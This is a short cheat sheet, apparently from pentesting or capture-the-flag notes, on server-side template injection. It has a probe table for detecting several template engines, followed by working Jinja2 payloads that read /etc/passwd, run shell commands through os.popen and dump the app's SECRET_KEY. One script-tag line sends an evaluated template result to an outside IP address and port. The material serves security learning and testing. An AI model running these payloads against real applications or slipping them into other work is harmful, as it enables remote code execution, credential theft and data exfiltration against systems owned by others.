# Server-Side Template Injection (SSTI)

Techniques for identifying and exploiting SSTI vulnerabilities in web applications.

## Table of Contents

- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
  - [Detection](#detection)
  - [Exploitation](#exploitation)
  - [Files](#files)
  - [References](#references)
    - [Challenges](#challenges)
    - [Web Sites](#web-sites)

---

## Overview

SSTI occurs when user input is embedded directly into a server-side template and evaluated. Depending on the template engine, this can lead to information disclosure or full remote code execution.

---

## Detection

Inject template-specific probe strings and observe whether they are evaluated:

| Engine | Probe | Expected Output |
|---|---|---|
| Jinja2 / Twig | `{{7*7}}` | `49` |
| Jinja2 | `{{7*'7'}}` | `7777777` |
| Twig | `{{7*'7'}}` | `49` |
| Mako / Smarty | `${7*7}` | `49` |
| Freemarker | `${7*7}` | `49` |

---

## Exploitation

Below are examples of template syntax specific to Flask's default templating engine Jinja2.
```python
# Read files
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# RCE to run command, e.g., "id", "whoami"
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

# Simpler RCE
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

# Alternate syntax
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }} 

# To check for an environment variable, e.g., SECRET_KEY:
{{ config['SECRET_KEY'] }}
```

The following syntax runs a template command on a remote server and sends the result back to the host:
```html
<script>var XSS=new Image;XSS.src="http://10.102.130.229:5555/?"+{{ 7 * 7 }};</script>
```

---

## Files

| File | Description |
|---|---|
| [`script.py`](./script.py) | Automated SSTI exploitation |

---

## References

### Challenges
| Source | Name |
|---|---|
| N/A | N/A |

### Web Sites
- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings - SSTI](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/)
